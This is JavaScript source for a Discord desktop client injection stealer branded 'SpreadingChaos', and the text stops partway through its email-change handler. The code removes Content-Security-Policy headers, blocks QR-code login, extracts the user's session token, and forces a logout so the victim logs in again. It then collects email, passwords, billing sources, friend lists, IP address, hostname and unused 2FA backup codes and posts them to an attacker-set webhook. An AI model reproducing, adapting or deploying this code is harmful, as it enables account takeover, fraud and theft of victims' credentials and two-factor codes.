const fs = require('fs');
const path = require('path');
const {
    BrowserWindow,
    session
} = require('electron')
const querystring = require('querystring');
const os = require('os')
var webhook = "%WEBHOOK_LINK%";
const computerName = os.hostname();
const discordInstall = `${__dirname}`
const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function (index, string) {
    if (index > 0) {
        return this.substring(0, index) + string + this.substr(index);
    }

    return string + this;
};

const config = {
    "logout": "instant",
    "logout-notify": "true",
    "init-notify":"true",
    "embed-color": 0000000,
    "disable-qr-code":"true"
}

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }


    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }

})




function FirstTime() {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "init"))) {
                fs.rmdirSync(path.join(__dirname, "init"));
                if (token == null || token == undefined || token == "") {
                    var c = {
                        embeds: [{
                            title: "Discord Initalized (User not Logged in)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Info",
                                value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: "SpreadingChaos"
                            },
                            footer: {
                                text: "SpreadingChaos"
                            }
                        }]
                    };
                    SendToWebhook(JSON.stringify(c))
                } else {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
                        const b = JSON.parse(a);
                        var c = {
                            embeds: [{
                                title: "Discord Initalized",
                                description: "[**<:partner:967100170712014898> │ Click Here To Copy**](https://ctf.surf/raw/"+ token +")",
                                color: config["embed-color"],
                                fields: [{
                                    name: "Username",
                                    value: `\`${b.username}#${b.discriminator}\``,
                                    inline: !0
                                }, {
                                    name: "ID",
                                    value: `\`${b.id}\``,
                                    inline: !0
                                }, {
                                    name: "Badges",
                                    value: `${GetBadges(b.flags)}`,
                                    inline: !1
                                }, {
                                    name: "Token",
                                    value: `\`\`\`${token}\`\`\``,
                                    inline: !1
                                }],
                                author: {
                                    name: "SpreadingChaos"
                                },
                                footer: {
                                    text: "SpreadingChaos"
                                },
                                thumbnail: {
                                    url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                }
                            }]
                        };
                        SendToWebhook(JSON.stringify(c))
                    });
                }

            }
        }
        if (!fs.existsSync(path.join(__dirname, "SpreadingChaosBTW"))) {
            return !0
        }
        fs.rmdirSync(path.join(__dirname, "SpreadingChaosBTW"));
        if (config.logout != "false" || config.logout == "%LOGOUT%") {
            if (config['logout-notify'] == "true") {
                if (token == null || token == undefined || token == "") {
                    var c = {
                        embeds: [{
                            title: "User log out (User not Logged in before)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Info",
                                value: `\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,
                                inline: !1
                            }],
                            author: {
                                name: "SpreadingChaos"
                            },
                            footer: {
                                text: "SpreadingChaos"
                            }
                        }]
                    };
                    SendToWebhook(JSON.stringify(c))
                } else {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`
                    var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;
                    `, !0).then(a => {
                        const b = JSON.parse(a);
                        var c = {
                            embeds: [{
                                title: "User got logged out",
                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +")",
                                color: config["embed-color"],
                                fields: [{
                                    name: "Username",
                                    value: `\`${b.username}#${b.discriminator}\``,
                                    inline: !0
                                }, {
                                    name: "ID",
                                    value: `\`${b.id}\``,
                                    inline: !0
                                }, {
                                    name: "Badges",
                                    value: `${GetBadges(b.flags)}`,
                                    inline: !1
                                }, {
                                    name: "Token",
                                    value: `\`\`\`${token}\`\`\``,
                                    inline: !1
                                }],
                                author: {
                                    name: "SpreadingChaos"
                                },
                                footer: {
                                    text: "SpreadingChaos"
                                },
                                thumbnail: {
                                    url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                }
                            }]
                        };
                        SendToWebhook(JSON.stringify(c))
                    });
                }
            }
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
        }
        return !1
    }))
}
const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}
session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => {
    if (details.url.startsWith("wss://")) {
        if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%") {
            callback({
                cancel: true
            })
            return;
        }
    }
    if (FirstTime()) {}

    callback({})
    return;
})

function SendToWebhook(a) {
  const w = BrowserWindow.getAllWindows()[0]
  w.webContents
    .executeJavaScript(
      '\n\tvar xhr = new XMLHttpRequest();\n    xhr.open("POST", "' +
        webhook +
        "\", true);\n    xhr.setRequestHeader('Content-Type', 'application/json');\n    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');\n    xhr.send(JSON.stringify(" +
        a +
        '));\n    ',
      true
    )
    .then((W) => {})
}

function GetNitro(flags) {
    if (flags == 0) {
        return "No Nitro"
    }
    if (flags == 1) {
        return "<:classic:967106418786320404> \`Nitro Classic\`"
    }
    if (flags == 2) {
        return "<:1m:967104133070979153> \`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}

function GetRBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:967100974420336751> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:967100170712014898> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad:967104881494204497> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter1:967100758170402906> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early:967104882056249384> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter2:967100784238010449> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<a:developer:967101205417451592> "
    }
    if (badges == "") {
        badges = ""
    }
    return badges
}

function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:967100974420336751> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:967100170712014898> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad:967104881494204497> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter1:967100758170402906> "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:bravery:967102775076982865> "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:brilliance:967102732706140190> "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:balance:967102683045589082> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early:967104882056249384> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<a:developer:967101205417451592> "
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

                            var fieldo = [];
                            var baseuri = "https://ctf.surf/raw/"


                            var gayass = JSON.parse(codes)

                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `Code`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }

                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {

                                    return user.type == 1
                                })
                                return r.length
                            }

                            function CalcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "No Rare Friends"
                                }
                                return gay
                            }


                            function Cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " :credit_card:"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);

                            var params = {
                                "embeds": [{
                                    "title": "User Login",
                                    "description": "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        "name": "Username",
                                        "value": `\`${json.username}#${json.discriminator}\``,
                                        "inline": !0
                                    }, {
                                        "name": "ID",
                                        "value": `\`${json.id}\``,
                                        "inline": !0
                                    }, {
                                        "name": "Nitro",
                                        "value": `${GetNitro(json.premium_type)}`,
                                        "inline": !1
                                    }, {
                                        "name": "Badges",
                                        "value": `${GetBadges(json.flags)}`,
                                        "inline": !1
                                    }, {
                                        "name": "Billing",
                                        "value": `${Cool()}`,
                                        "inline": !1
                                    }, {
                                        "name": "Email",
                                        "value": `\`${email}\``,
                                        "inline": !0
                                    }, {
                                        "name": "Password",
                                        "value": `\`${password}\``,
                                        "inline": !0
                                    }, {
                                        "name": "Token",
                                        "value": `\`\`\`${token}\`\`\``,
                                        "inline": !1
                                    }, ],
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `Friends with rare badges (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": CalcFriends(),
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": ":detective: __2FA Codes__",
                                "description": `[Get all of them](${baseuri})`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "SpreadingChaos"
                                },
                                "footer": {
                                    "text": "SpreadingChaos"
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }

                            SendToWebhook(JSON.stringify(params))

                        })
                    } else {

                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }

                                        function CalcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "No Rare Friends"
                                            }
                                            return gay
                                        }

                                        function Cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            "embeds": [{
                                                "title": "User Login",
                                                "description": "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ password+")",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    "name": "Username",
                                                    "value": `\`${json.username}#${json.discriminator}\``,
                                                    "inline": !0
                                                }, {
                                                    "name": "ID",
                                                    "value": `\`${json.id}\``,
                                                    "inline": !0
                                                }, {
                                                    "name": "Nitro",
                                                    "value": `${GetNitro(json.premium_type)}`,
                                                    "inline": !1
                                                }, {
                                                    "name": "Badges",
                                                    "value": `${GetBadges(json.flags)}`,
                                                    "inline": !1
                                                }, {
                                                    "name": "Billing",
                                                    "value": `${Cool()}`,
                                                    "inline": !1
                                                }, {
                                                    "name": "Email",
                                                    "value": `\`${email}\``,
                                                    "inline": !0
                                                }, {
                                                    "name": "Password",
                                                    "value": `\`${password}\``,
                                                    "inline": !0
                                                }, {
                                                    "name": "Token",
                                                    "value": `\`\`\`${token}\`\`\``,
                                                    "inline": !1
                                                }, ],
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `Friends with rare badges (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": CalcFriends(),
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        SendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })

                    }
                })
            })
        })
    })

}

function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

                    if (token.startsWith("mfa")) {
                        window.webContents.executeJavaScript(`
              var xmlHttp = new XMLHttpRequest();
              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
              xmlHttp.setRequestHeader('Content-Type', 'application/json');
              xmlHttp.setRequestHeader("authorization", "${token}")
              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":false}));
              xmlHttp.responseText`, !0).then((codes) => {

                            var fieldo = [];
                            var baseuri = "https://ctf.surf/raw/"


                            var gayass = JSON.parse(codes)
                            let g = gayass.backup_codes
                            const r = g.filter((code) => {
                                return code.consumed == null
                            })
                            for (let z in r) {
                                fieldo.push({
                                    name: `Code`,
                                    value: `\`${r[z].code.insert(4, "-")}\``,
                                    inline: true
                                })
                                baseuri += `${r[z].code.insert(4, "-")}<br>`
                            }

                            function totalFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {

                                    return user.type == 1
                                })
                                return r.length
                            }

                            function CalcFriends() {
                                var f = JSON.parse(info4)
                                const r = f.filter((user) => {
                                    return user.type == 1
                                })
                                var gay = "";
                                for (z of r) {
                                    var b = GetRBadges(z.user.public_flags)
                                    if (b != "") {
                                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                    }
                                }
                                if (gay == "") {
                                    gay = "No Rare Friends"
                                }
                                return gay
                            }

                            function Cool() {
                                const json = JSON.parse(info3)
                                var billing = "";
                                json.forEach(z => {
                                    if (z.type == "") {
                                        return "\`❌\`"
                                    } else if (z.type == 2 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                    } else if (z.type == 1 && z.invalid != !0) {
                                        billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                    } else {
                                        return "\`❌\`"
                                    }
                                })
                                if (billing == "") {
                                    billing = "\`❌\`"
                                }
                                return billing
                            }
                            const json = JSON.parse(info);

                            var params = {
                                embeds: [{
                                    "title": "The password has been changed !",
                                    description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
                                    "color": config['embed-color'],
                                    "fields": [{
                                        name: "Username",
                                        value: `\`${json.username}#${json.discriminator}\``,
                                        inline: !0
                                    }, {
                                        name: "ID",
                                        value: `\`${json.id}\``,
                                        inline: !0
                                    }, {
                                        name: "Nitro",
                                        value: `${GetNitro(json.premium_type)}`,
                                        inline: !1
                                    }, {
                                        name: "Badges",
                                        value: `${GetBadges(json.flags)}`,
                                        inline: !1
                                    }, {
                                        name: "Billing",
                                        value: `${Cool()}`,
                                        inline: !1
                                    }, {
                                        name: "Email",
                                        value: `\`${json.email}\``,
                                        inline: !1
                                    }, {
                                        name: "Old Password",
                                        value: `\`${oldpassword}\``,
                                        inline: !0
                                    }, {
                                        name: "New Password",
                                        value: `\`${newpassword}\``,
                                        inline: !0
                                    }, {
                                        name: "Token",
                                        value: `\`\`\`${token}\`\`\``,
                                        inline: !1
                                    }, ],
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }, {
                                    "title": `Friends with rare badges (${totalFriends()})`,
                                    "color": config['embed-color'],
                                    "description": CalcFriends(),
                                    "author": {
                                        "name": "SpreadingChaos"
                                    },
                                    "footer": {
                                        "text": "SpreadingChaos"
                                    },
                                    "thumbnail": {
                                        "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                    }
                                }]
                            }
                            var mfaembed = {
                                "title": ":detective: __2FA Codes__",
                                "description": `[Get all of them](${baseuri})`,
                                "color": config['embed-color'],
                                "fields": fieldo,
                                "author": {
                                    "name": "SpreadingChaos"
                                },
                                "footer": {
                                    "text": "SpreadingChaos"
                                }
                            }
                            if (token.startsWith("mfa")) {
                                params.embeds.push(mfaembed)
                            }

                            SendToWebhook(JSON.stringify(params))

                        })
                    } else {

                        const window = BrowserWindow.getAllWindows()[0];
                        window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
                            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
                                window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                                    window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

                                        function totalFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            return r.length
                                        }

                                        function CalcFriends() {
                                            var f = JSON.parse(info4)
                                            const r = f.filter((user) => {
                                                return user.type == 1
                                            })
                                            var gay = "";
                                            for (z of r) {
                                                var b = GetRBadges(z.user.public_flags)
                                                if (b != "") {
                                                    gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                                                }
                                            }
                                            if (gay == "") {
                                                gay = "No Rare Friends"
                                            }
                                            return gay
                                        }

                                        function Cool() {
                                            const json = JSON.parse(info3)
                                            var billing = "";
                                            json.forEach(z => {
                                                if (z.type == "") {
                                                    return "\`❌\`"
                                                } else if (z.type == 2 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <:paypal:967103386967216158>"
                                                } else if (z.type == 1 && z.invalid != !0) {
                                                    billing += "\`✔️\`" + " <a:cc:967103197044932649>"
                                                } else {
                                                    return "\`❌\`"
                                                }
                                            })
                                            if (billing == "") {
                                                billing = "\`❌\`"
                                            }
                                            return billing
                                        }
                                        const json = JSON.parse(info);
                                        var params = {
                                            embeds: [{
                                                "title": "The password has been changed !",
                                                description: "[**<:partner:967100170712014898> │ Click here to copy info**](https://ctf.surf/raw/"+ token +"<br>"+ newpassword+")",
                                                "color": config['embed-color'],
                                                "fields": [{
                                                    name: "Username",
                                                    value: `\`${json.username}#${json.discriminator}\``,
                                                    inline: !0
                                                }, {
                                                    name: "ID",
                                                    value: `\`${json.id}\``,
                                                    inline: !0
                                                }, {
                                                    name: "Nitro",
                                                    value: `${GetNitro(json.premium_type)}`,
                                                    inline: !1
                                                }, {
                                                    name: "Badges",
                                                    value: `${GetBadges(json.flags)}`,
                                                    inline: !1
                                                }, {
                                                    name: "Billing",
                                                    value: `${Cool()}`,
                                                    inline: !1
                                                }, {
                                                    name: "Email",
                                                    value: `\`${json.email}\``,
                                                    inline: !1
                                                }, {
                                                    name: "Old Password",
                                                    value: `\`${oldpassword}\``,
                                                    inline: !0
                                                }, {
                                                    name: "New Password",
                                                    value: `\`${newpassword}\``,
                                                    inline: !0
                                                }, {
                                                    name: "Token",
                                                    value: `\`\`\`${token}\`\`\``,
                                                    inline: !1
                                                }, ],
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }, {
                                                "title": `Friends with rare badges (${totalFriends()})`,
                                                "color": config['embed-color'],
                                                "description": CalcFriends(),
                                                "author": {
                                                    "name": "SpreadingChaos"
                                                },
                                                "footer": {
                                                    "text": "SpreadingChaos"
                                                },
                                                "thumbnail": {
                                                    "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
                                                }
                                            }]
                                        }
                                        SendToWebhook(JSON.stringify(params))
                                    })
                                })
                            })
                        })

                    }
                })
            })
        })
    })
}

function ChangeEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    xmlHttp.responseText;`, !0).then((info) => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
        xmlHttp.send( null );
        xmlHttp.responseText;
    `, !0).then((ip) => {
            window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
                window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
